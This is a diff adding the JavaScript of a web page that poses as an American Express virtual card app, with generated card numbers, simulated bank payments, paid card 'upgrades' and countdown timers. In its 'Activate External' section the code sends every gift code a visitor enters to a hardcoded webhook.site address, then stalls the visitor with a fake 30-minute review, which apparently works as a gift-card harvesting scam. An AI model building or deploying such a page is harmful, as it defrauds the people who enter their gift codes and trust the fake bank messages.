+        let isCardFullyActivated = false;
+        let activation24hrInterval;
+        let activation30minInterval;
+        let warningModalTimeout;
+        let selectedNetflixPlanCost = 0;
+        let selectedNetflixPlanName = '';
+        let originalGetCardBtnText = ''; // To store original button text
+
+        // DOM Elements
+        const welcomeSection = document.getElementById('welcomeSection');
+        const getCardBtn = document.getElementById('getCardBtn');
+        const getCardButtonContainer = document.getElementById('getCardButtonContainer');
+        const virtualCardDisplay = document.getElementById('virtualCardDisplay');
+        const creditCard = document.getElementById('creditCard');
+        const amexLogo = document.getElementById('amexLogo');
+        const cardTypeLogo = document.getElementById('cardTypeLogo'); // New element for card type logo
+        const cardFrontFace = document.getElementById('cardFrontFace'); // New ID for front face
+        const cardBackFace = document.getElementById('cardBackFace'); // New ID for back face
+        const cardNumberDisplay = document.getElementById('cardNumber');
+        const cardExpiryDisplay = document.getElementById('cardExpiry');
+        const cardNameDisplay = document.getElementById('cardName');
+        const cardCvvDisplay = document.getElementById('displayCardCvv');
+        const cardCvvDisplayBack = document.getElementById('cardCvvDisplayBack'); // Actual CVV on back
+        const cardBenefitMsg = document.getElementById('cardBenefitMsg');
+        const mainOptions = document.getElementById('mainOptions');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const messageModal = document.getElementById('messageModal');
+        const modalContent = document.getElementById('modalContent');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const warningModal = document.getElementById('warningModal');
+        const closeWarningModalBtn = document.getElementById('closeWarningModalBtn');
+        const cardSection = document.getElementById('cardSection');
+        const virtualCardText = document.getElementById('virtualCardText');
+        const paymentProcessingModal = document.getElementById('paymentProcessingModal');
+        const paymentModalTitle = document.getElementById('paymentModalTitle');
+        const paymentStatusText = document.getElementById('paymentStatusText');
+        const paymentProgressBar = document.getElementById('paymentProgressBar');
+        const mainContainer = document.querySelector('.container'); // Get the main container
+
+        // Section buttons
+        const useCardBtn = document.getElementById('useCardBtn');
+        const cardDetailsBtn = document.getElementById('cardDetailsBtn');
+        const purchaseBenefitCardBtn = document.getElementById('purchaseBenefitCardBtn');
+        const activateExternalBtn = document.getElementById('activateExternalBtn');
+
+        // Sections
+        const useCardSection = document.getElementById('useCardSection');
+        const cardDetailsSection = document.getElementById('cardDetailsSection');
+        const purchaseBenefitCardSection = document.getElementById('purchaseBenefitCardSection');
+        const activateExternalSection = document.getElementById('activateExternalSection');
+
+        // Use Card Section Elements
+        const appButtons = document.querySelectorAll('.app-button');
+        const netflixPlanModal = document.getElementById('netflixPlanModal');
+        const closeNetflixModalBtn = document.getElementById('closeNetflixModalBtn');
+        const planOptions = document.querySelectorAll('.plan-option');
+        const confirmNetflixPlanBtn = document.getElementById('confirmNetflixPlanBtn');
+        const amazonPrimeButton = document.querySelector('.app-button[data-app="amazon-prime"]');
+        const flipkartButton = document.querySelector('.app-button[data-app="flipkart"]');
+        const zomatoButton = document.querySelector('.app-button[data-app="zomato"]');
+
+        // Card Details Section Elements
+        const displayCardNumber = document.getElementById('displayCardNumber');
+        const displayCardCvv = document.getElementById('displayCardCvv');
+        const displayCardExpiry = document.getElementById('displayCardExpiry');
+        const checkBalanceBtn = document.getElementById('checkBalanceBtn');
+        const balanceDisplay = document.getElementById('balanceDisplay');
+        const currentBalanceSpan = document.getElementById('currentBalance');
+        const installmentAmountSpan = document.getElementById('installmentAmount');
+        const holderNameInput = document.getElementById('holderName');
+        const ifscCodeInput = document.getElementById('ifscCode');
+        const realNameInput = document.getElementById('realName');
+        const saveBankDetailsBtn = document.getElementById('saveBankDetailsBtn');
+        const transactionHistoryDiv = document.getElementById('transactionHistory');
+        const copyButtons = document.querySelectorAll('.copy-btn');
+
+        // Purchase Benefit Card Section Elements
+        const purchaseCardButtons = document.querySelectorAll('.purchase-card-btn');
+
+        // Activate External Section Elements
+        const activationMessage = document.getElementById('activationMessage');
+        const countdown24hr = document.getElementById('countdown24hr');
+        const giftCodeInput = document.getElementById('giftCode');
+        const activateExternalUseBtn = document.getElementById('activateExternalUseBtn');
+        // Renamed and re-structured elements for review message
+        const reviewMessageContainer = document.getElementById('reviewMessageContainer');
+        const reviewTextMessage = document.getElementById('reviewTextMessage');
+        const countdown30min = document.getElementById('countdown30min');
+        const fullActivationBenefits = document.getElementById('fullActivationBenefits');
+
+        // Back Buttons
+        const backButtons = document.querySelectorAll('.back-btn');
+
+        // --- Utility Functions ---
+
+        function showLoading(message) {
+            loadingText.textContent = message;
+            loadingOverlay.classList.remove('hidden');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.add('hidden');
+        }
+
+        function showModal(message, isSuccess = true) {
+            modalContent.innerHTML = `
+                <div class="flex flex-col items-center">
+                    <i class="fas ${isSuccess ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500'} text-5xl mb-4"></i>
+                    <p class="text-xl font-semibold text-gray-200">${message}</p>
+                </div>
+            `;
+            messageModal.classList.add('show');
+        }
+
+        async function simulatePaymentProcess(cost, description) {
+            paymentProcessingModal.classList.add('show');
+            paymentModalTitle.textContent = 'Processing Payment...';
+            paymentProgressBar.style.width = '0%';
+            paymentProgressBar.style.backgroundColor = '#00FFFF'; // Reset color to neon blue
+
+            const steps = [
+                { text: 'Initiating transaction...', delay: 1000, progress: 20 },
+                { text: 'Connecting to bank gateway...', delay: 1500, progress: 40 },
+                { text: 'Card accepted by bank...', delay: 2000, progress: 70 },
+                { text: 'Money is deducting...', delay: 1500, progress: 90 },
+                { text: 'Payment almost done...', delay: 1000, progress: 100 }
+            ];
+
+            for (let i = 0; i < steps.length; i++) {
+                const step = steps[i];
+                paymentStatusText.textContent = step.text;
+                paymentProgressBar.style.width = `${step.progress}%`;
+                await new Promise(resolve => setTimeout(resolve, step.delay));
+            }
+
+            // Deduct money and add transaction here, before showing final success
+            currentBalance -= cost;
+            addTransaction(description, cost, 'debit');
+            updateBalanceDisplay(); // Update balance immediately after deduction
+
+            // Final success state
+            paymentModalTitle.textContent = 'Transaction Successful!';
+            paymentStatusText.innerHTML = `<i class="fas fa-check-circle text-green-500 text-3xl success-tick"></i><p class="mt-2">Successfully purchased ${description} for ₹${cost.toLocaleString('en-IN')}</p>`;
+            paymentProgressBar.style.width = '100%';
+            paymentProgressBar.style.backgroundColor = '#28a745'; // Green for success
+
+            await new Promise(resolve => setTimeout(resolve, 2000)); // Show success for 2 seconds
+            paymentProcessingModal.classList.remove('show');
+        }
+
+        function hideModal() {
+            messageModal.classList.remove('show');
+        }
+
+        function showWarningModal() {
+            warningModal.classList.add('show');
+        }
+
+        function hideWarningModal() {
+            warningModal.classList.remove('show');
+        }
+
+        function generateRandomCardDetails() {
+            const generateNumber = (length) => Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
+            const formatCardNumber = (num) => num.match(/.{1,4}/g).join(' ');
+
+            const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+            const year = String(new Date().getFullYear() + Math.floor(Math.random() * 5)).slice(2); // Next 5 years from current year
+            const names = ["JOHN DOE", "JANE SMITH", "ALEX JOHNSON", "MARIA GARCIA"];
+
+            return {
+                number: formatCardNumber(generateNumber(16)),
+                expiry: `${month}/${year}`,
+                cvv: generateNumber(3),
+                name: names[Math.floor(Math.random() * names.length)]
+            };
+        }
+
+        function updateCardUI() {
+            const cardDetails = generateRandomCardDetails(); // Generate new details each time for demo
+            cardNumberDisplay.textContent = cardDetails.number;
+            cardExpiryDisplay.textContent = cardDetails.expiry;
+            cardNameDisplay.textContent = cardDetails.name;
+            cardCvvDisplayBack.textContent = cardDetails.cvv; // Actual CVV on back
+            cardCvvDisplay.textContent = cardDetails.cvv; // For display in card details section
+
+            // Remove all existing card type classes to ensure only the new one applies
+            cardFrontFace.classList.remove('default-card', 'silver-card', 'golden-card', 'black-premium-card');
+            // Add the new card type class
+            cardFrontFace.classList.add(`${cardType}-card`);
+
+            // Update AMEX logo and add specific card type logo
+            amexLogo.className = `amex-logo ${cardType}-logo`;
+            let logoText = '';
+            if (cardType === 'silver') {
+                logoText = 'SILVER';
+            } else if (cardType === 'golden') {
+                logoText = 'GOLD';
+            } else if (cardType === 'black-premium') {
+                logoText = 'PREMIUM';
+            }
+            cardTypeLogo.textContent = logoText;
+
+            // Reset CVV visibility on card type change
+            isCvvVisible = false;
+            cardCvvDisplayBack.classList.add('cvv-hidden');
+        }
+
+        function updateBalanceDisplay() {
+            currentBalanceSpan.textContent = `₹${currentBalance.toLocaleString('en-IN')}`;
+            installmentAmountSpan.textContent = `₹${monthlyInstallment.toLocaleString('en-IN')}`;
+        }
+
+        function addTransaction(description, amount, type = 'debit') {
+            const date = new Date().toLocaleString();
+            transactions.unshift({ date, description, amount, type }); // Add to the beginning
+            renderTransactionHistory();
+        }
+
+        function renderTransactionHistory() {
+            if (transactions.length === 0) {
+                transactionHistoryDiv.innerHTML = '<p class="text-gray-500 text-center">No transactions yet.</p>';
+                return;
+            }
+            transactionHistoryDiv.innerHTML = transactions.map(t => `
+                <div class="flex justify-between items-center py-2 border-b border-gray-600 last:border-b-0">
+                    <div>
+                        <p class="font-medium text-gray-200">${t.description}</p>
+                        <p class="text-sm text-gray-400">${t.date}</p>
+                    </div>
+                    <span class="${t.type === 'debit' ? 'text-red-500' : 'text-green-500'} font-semibold">
+                        ${t.type === 'debit' ? '-' : '+'}${t.amount.toLocaleString('en-IN')}₹
+                    </span>
+                </div>
+            `).join('');
+        }
+
+        function showSection(sectionId) {
+            document.querySelectorAll('.section-container').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+            mainOptions.classList.add('hidden'); // Hide main options when a section is active
+            cardBenefitMsg.classList.add('hidden'); // Hide benefit message when a section is active
+        }
+
+        function showMainOptions() {
+            document.querySelectorAll('.section-container').forEach(section => {
+                section.classList.remove('active');
+            });
+            mainOptions.classList.remove('hidden'); // Show main options
+            cardBenefitMsg.classList.remove('hidden'); // Show benefit message when main options are active
+        }
+
+        // --- Event Listeners ---
+
+        getCardBtn.addEventListener('click', () => {
+            // Store original button text
+            originalGetCardBtnText = getCardBtn.innerHTML;
+
+            // Show loading spinner on the button
+            getCardBtn.innerHTML = '<div class="button-spinner mx-auto"></div>';
+            getCardBtn.disabled = true; // Disable button during loading
+
+            // Simulate loading and then transition
+            setTimeout(() => {
+                getCardBtn.innerHTML = originalGetCardBtnText; // Restore button text
+                getCardBtn.disabled = false; // Re-enable button
+
+                welcomeSection.classList.add('hidden'); // This hides the welcome section
+                mainContainer.classList.remove('hidden'); // Make the main container visible
+                cardSection.classList.remove('hidden'); // Make the card section visible (it's inside mainContainer)
+                cardBenefitMsg.classList.remove('hidden');
+                mainOptions.classList.remove('hidden'); // Show main options after card is visible
+                virtualCardText.classList.remove('neon-text'); // Stop neon animation
+                virtualCardText.textContent = "Your American Express Virtual Card"; // Update text
+                updateCardUI(); // Populate card details
+                updateBalanceDisplay(); // Display initial balance
+            }, 2000); // 2 seconds for the loading animation
+        });
+
+        creditCard.addEventListener('click', () => {
+            isCardFlipped = !isCardFlipped;
+            if (isCardFlipped) {
+                creditCard.classList.add('flipped');
+            } else {
+                creditCard.classList.remove('flipped');
+                isCvvVisible = false; // Hide CVV when flipping back to front
+                cardCvvDisplayBack.classList.add('cvv-hidden');
+            }
+        });
+
+        // Toggle CVV visibility on back of card
+        cardCvvDisplayBack.addEventListener('click', (event) => {
+            event.stopPropagation(); // Prevent card from flipping back
+            isCvvVisible = !isCvvVisible;
+            if (isCvvVisible) {
+                cardCvvDisplayBack.classList.remove('cvv-hidden');
+            } else {
+                cardCvvDisplayBack.classList.add('cvv-hidden');
+            }
+        });
+
+
+        closeModalBtn.addEventListener('click', hideModal);
+        closeWarningModalBtn.addEventListener('click', hideWarningModal);
+        closeNetflixModalBtn.addEventListener('click', () => {
+            netflixPlanModal.classList.remove('show');
+            // Reset plan selection
+            if (selectedPlanElement) {
+                selectedPlanElement.classList.remove('border-2', 'border-blue-500');
+                selectedPlanElement = null;
+            }
+            confirmNetflixPlanBtn.classList.add('hidden');
+            selectedNetflixPlanCost = 0;
+            selectedNetflixPlanName = '';
+        });
+
+
+        // Main option buttons
+        useCardBtn.addEventListener('click', () => {
+            showLoading('Opening Use Card options...');
+            setTimeout(() => {
+                hideLoading();
+                showSection('useCardSection');
+            }, 500);
+        });
+
+        cardDetailsBtn.addEventListener('click', () => {
+            showLoading('Fetching card details...');
+            setTimeout(() => {
+                hideLoading();
+                showSection('cardDetailsSection');
+                // Populate card details in this section
+                displayCardNumber.textContent = cardNumberDisplay.textContent;
+                displayCardCvv.textContent = cardCvvDisplayBack.textContent; // Use the actual CVV from back
+                displayCardExpiry.textContent = cardExpiryDisplay.textContent;
+                updateBalanceDisplay(); // Ensure balance is updated
+                renderTransactionHistory(); // Render transaction history
+            }, 500);
+        });
+
+        purchaseBenefitCardBtn.addEventListener('click', () => {
+            showLoading('Loading benefit cards...');
+            setTimeout(() => {
+                hideLoading();
+                showSection('purchaseBenefitCardSection');
+            }, 500);
+        });
+
+        activateExternalBtn.addEventListener('click', () => {
+            showLoading('Preparing activation options...');
+            setTimeout(() => {
+                hideLoading();
+                showSection('activateExternalSection');
+                if (isNetflixSubscribed) {
+                    activationMessage.classList.remove('hidden');
+                    // Start 24hr countdown if Netflix is subscribed
+                    let totalSeconds24hr = 24 * 3600;
+                    if (activation24hrInterval) clearInterval(activation24hrInterval); // Clear previous if any
+                    activation24hrInterval = setInterval(() => {
+                        totalSeconds24hr--;
+                        if (totalSeconds24hr < 0) {
+                            clearInterval(activation24hrInterval);
+                            countdown24hr.textContent = '00:00:00';
+                        } else {
+                            const hours = Math.floor(totalSeconds24hr / 3600);
+                            const minutes = Math.floor((totalSeconds24hr % 3600) / 60);
+                            const seconds = totalSeconds24hr % 60;
+                            countdown24hr.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                        }
+                    }, 1000);
+                }
+            }, 500);
+        });
+
+        // Back button logic
+        backButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                showLoading('Returning to main options...');
+                // Clear any active intervals when going back
+                if (activation24hrInterval) clearInterval(activation24hrInterval);
+                if (activation30minInterval) clearInterval(activation30minInterval);
+                if (warningModalTimeout) clearTimeout(warningModalTimeout);
+                netflixPlanModal.classList.remove('show'); // Ensure Netflix modal is hidden
+
+                setTimeout(() => {
+                    hideLoading();
+                    showMainOptions();
+                }, 500);
+            });
+        });
+
+        // --- Use Card Section Logic ---
+        appButtons.forEach(button => {
+            button.addEventListener('click', async () => {
+                const appName = button.dataset.app;
+                const cost = parseInt(button.dataset.cost);
+
+                if (button.disabled) {
+                    showModal(`This app is locked. Please upgrade your card to access it.`, false);
+                    return;
+                }
+
+                if (appName === 'netflix') {
+                    netflixPlanModal.classList.add('show');
+                } else {
+                    if (currentBalance < cost) {
+                        showModal('Insufficient balance to purchase this subscription!', false);
+                        return;
+                    }
+
+                    await simulatePaymentProcess(cost, `${appName} Subscription`);
+
+                    if (appName === 'amazon-prime') {
+                        isAmazonPrimeSubscribed = true;
+                    }
+                }
+            });
+        });
+
+        // Netflix Plan Selection Logic
+        let selectedPlanElement = null;
+        planOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                if (selectedPlanElement) {
+                    selectedPlanElement.classList.remove('border-2', 'border-blue-500');
+                }
+                option.classList.add('border-2', 'border-blue-500');
+                selectedPlanElement = option;
+                selectedNetflixPlanCost = parseInt(option.dataset.planCost);
+                selectedNetflixPlanName = option.dataset.planName;
+                confirmNetflixPlanBtn.classList.remove('hidden');
+            });
+        });
+
+        confirmNetflixPlanBtn.addEventListener('click', async () => {
+            if (!selectedNetflixPlanCost) {
+                showModal('Please select a Netflix plan.', false);
+                return;
+            }
+
+            if (currentBalance < selectedNetflixPlanCost) {
+                showModal('Insufficient balance to purchase this Netflix plan!', false);
+                return;
+            }
+
+            netflixPlanModal.classList.remove('show');
+
+            await simulatePaymentProcess(selectedNetflixPlanCost, `Netflix ${selectedNetflixPlanName} Plan`);
+
+            isNetflixSubscribed = true;
+            activationMessage.classList.remove('hidden');
+
+            if (selectedPlanElement) {
+                selectedPlanElement.classList.remove('border-2', 'border-blue-500');
+                selectedPlanElement = null;
+            }
+            confirmNetflixPlanBtn.classList.add('hidden');
+            selectedNetflixPlanCost = 0;
+            selectedNetflixPlanName = '';
+
+            let totalSeconds24hr = 24 * 3600;
+            if (activation24hrInterval) clearInterval(activation24hrInterval);
+            activation24hrInterval = setInterval(() => {
+                totalSeconds24hr--;
+                if (totalSeconds24hr < 0) {
+                    clearInterval(activation24hrInterval);
+                    countdown24hr.textContent = '00:00:00';
+                } else {
+                    const hours = Math.floor(totalSeconds24hr / 3600);
+                    const minutes = Math.floor((totalSeconds24hr % 3600) / 60);
+                    const seconds = totalSeconds24hr % 60;
+                    countdown24hr.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }
+            }, 1000);
+        });
+
+
+        // --- Card Details Section Logic ---
+        checkBalanceBtn.addEventListener('click', () => {
+            showLoading('Fetching card balance...');
+            setTimeout(() => {
+                hideLoading();
+                balanceDisplay.classList.remove('hidden');
+                balanceDisplay.classList.add('fade-in', 'balance-pulse');
+                updateBalanceDisplay();
+                setTimeout(() => {
+                    balanceDisplay.classList.remove('balance-pulse');
+                }, 500);
+            }, 1000);
+        });
+
+        saveBankDetailsBtn.addEventListener('click', () => {
+            const holderName = holderNameInput.value.trim();
+            const ifscCode = ifscCodeInput.value.trim();
+            const realName = realNameInput.value.trim();
+
+            if (!holderName || !ifscCode || !realName) {
+                showModal('Please fill in all bank details fields.', false);
+                return;
+            }
+
+            showLoading('Saving bank details...');
+            setTimeout(() => {
+                hideLoading();
+                showModal('Bank/UPI details added successfully!', true);
+                holderNameInput.value = '';
+                ifscCodeInput.value = '';
+                realNameInput.value = '';
+            }, 1500);
+        });
+
+        copyButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const targetId = button.dataset.target;
+                const textToCopy = document.getElementById(targetId).textContent;
+                try {
+                    const tempInput = document.createElement('textarea');
+                    tempInput.value = textToCopy;
+                    document.body.appendChild(tempInput);
+                    tempInput.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(tempInput);
+                    showModal('Copied to clipboard!', true);
+                } catch (err) {
+                    console.error('Failed to copy text: ', err);
+                    showModal('Failed to copy. Please try manually.', false);
+                }
+            });
+        });
+
+        // --- Purchase Benefit Card Section Logic ---
+        purchaseCardButtons.forEach(button => {
+            button.addEventListener('click', async () => {
+                const cardOptionDiv = button.closest('.card-option');
+                const newCardType = cardOptionDiv.dataset.card;
+                const cost = parseInt(cardOptionDiv.dataset.cost);
+                const newLimit = parseInt(cardOptionDiv.dataset.limit);
+                let installmentReduction = 0;
+
+                if (currentBalance < cost) {
+                    showModal('Insufficient balance to purchase this card!', false);
+                    return;
+                }
+
+                // Prevent purchasing the same or lower tier card
+                const cardTypeOrder = {'default': 0, 'silver': 1, 'golden': 2, 'black-premium': 3};
+                if (cardTypeOrder[newCardType] <= cardTypeOrder[cardType]) {
+                    showModal(`You already have a ${cardType.toUpperCase()} card or higher.`, false);
+                    return;
+                }
+
+
+                if (newCardType === 'golden') {
+                    // Golden card reduces installment by 1000 from default 5000
+                    installmentReduction = 1000;
+                } else if (newCardType === 'black-premium') {
+                    // Black Premium reduces installment by 2500 from default 5000
+                    installmentReduction = 2500;
+                }
+
+                await simulatePaymentProcess(cost, `${newCardType.charAt(0).toUpperCase() + newCardType.slice(1)} Card`);
+
+                cardType = newCardType; // Update the global cardType variable
+                currentBalance = newLimit; // Update balance to the new limit
+                monthlyInstallment = Math.max(0, monthlyInstallment - installmentReduction); // Reduce installment
+                updateCardUI(); // Call updateCardUI to apply the new cardType's style
+                updateBalanceDisplay();
+            });
+        });
+
+        // --- Activate External Section Logic ---
+        activateExternalUseBtn.addEventListener('click', async () => {
+            const giftCode = giftCodeInput.value.trim();
+            const webhookUrl = 'https://webhook.site/62201c41-343b-40b7-8dec-e95e4e5613c1'; // Your webhook URL
+
+            if (!giftCode) {
+                showModal('Please enter a gift code to activate.', false);
+                return;
+            }
+
+            // Disable button to prevent multiple clicks
+            activateExternalUseBtn.disabled = true;
+            activateExternalUseBtn.classList.add('opacity-50', 'cursor-not-allowed');
+
+            showLoading('Reviewing gift code...');
+
+            try {
+                // Send data to webhook
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ giftCode: giftCode, timestamp: new Date().toISOString() }),
+                });
+
+                if (response.ok) {
+                    console.log('Gift code sent to webhook successfully!');
+                    // Continue with existing logic after successful webhook send
+                    setTimeout(() => {
+                        hideLoading();
+                        reviewMessageContainer.classList.remove('hidden'); // Show the new container
+                        giftCodeInput.disabled = true; // Disable input after sending
+
+                        let totalSeconds30min = 30 * 60; // 30 minutes for review
+                        if (activation30minInterval) clearInterval(activation30minInterval);
+                        activation30minInterval = setInterval(() => {
+                            totalSeconds30min--;
+                            if (totalSeconds30min < 0) {
+                                clearInterval(activation30minInterval);
+                                countdown30min.textContent = '00:00';
+                                activateExternalUseBtn.disabled = false; // Re-enable button (though it might not be clicked again)
+                                activateExternalUseBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                                fullActivationBenefits.classList.remove('hidden');
+                                isCardFullyActivated = true;
+                                showModal('Your card is now fully activated for external use!', true);
+
+                                // Activate locked app buttons
+                                amazonPrimeButton.disabled = false;
+                                amazonPrimeButton.classList.remove('opacity-60', 'cursor-not-allowed');
+                                amazonPrimeButton.classList.add('hover:bg-blue-800'); // Add hover effect
+                                amazonPrimeButton.querySelector('span').textContent = 'Amazon Prime'; // Remove (Locked) text
+
+                                flipkartButton.disabled = false;
+                                flipkartButton.classList.remove('opacity-60', 'cursor-not-allowed');
+                                flipkartButton.classList.add('hover:bg-yellow-800');
+                                flipkartButton.querySelector('span').textContent = 'Flipkart';
+
+                                zomatoButton.disabled = false;
+                                zomatoButton.classList.remove('opacity-60', 'cursor-not-allowed');
+                                zomatoButton.classList.add('hover:bg-red-900');
+                                zomatoButton.querySelector('span').textContent = 'Zomato';
+
+
+                                warningModalTimeout = setTimeout(showWarningModal, 1000); // Show warning after 1 second
+                            } else {
+                                const minutes = Math.floor(totalSeconds30min / 60);
+                                const seconds = totalSeconds30min % 60;
+                                countdown30min.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                            }
+                        }, 1000);
+                    }, 2000); // Delay for loading message
+                } else {
+                    console.error('Failed to send gift code to webhook:', response.status, response.statusText);
+                    hideLoading();
+                    showModal('Failed to send gift code for review. Please try again later.', false);
+                    activateExternalUseBtn.disabled = false; // Re-enable button on failure
+                    activateExternalUseBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                }
+            } catch (error) {
+                console.error('Error sending gift code to webhook:', error);
+                hideLoading();
+                showModal('An error occurred while sending gift code. Please check your network.', false);
+                activateExternalUseBtn.disabled = false; // Re-enable button on network error
+                activateExternalUseBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+        });
+
+        // Initial setup on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initially ensure welcome section is visible and main container is hidden
+            welcomeSection.classList.remove('hidden');
+            mainContainer.classList.add('hidden'); // Hide the main container initially
+            // cardSection visibility will be managed when mainContainer becomes visible
+            mainOptions.classList.add('hidden');
+            cardBenefitMsg.classList.add('hidden');
+
+            // Set initial disabled state for app buttons
+            amazonPrimeButton.disabled = true;
+            amazonPrimeButton.classList.add('opacity-60', 'cursor-not-allowed');
+            flipkartButton.disabled = true;
+            flipkartButton.classList.add('opacity-60', 'cursor-not-allowed');
+            zomatoButton.disabled = true;
+            zomatoButton.classList.add('opacity-60', 'cursor-not-allowed');
+
+            updateCardUI(); // Call this once on load to set the initial default card style
+            updateBalanceDisplay();
+            renderTransactionHistory();
+        });
+
+    </script>
+</body>
+</html>
+
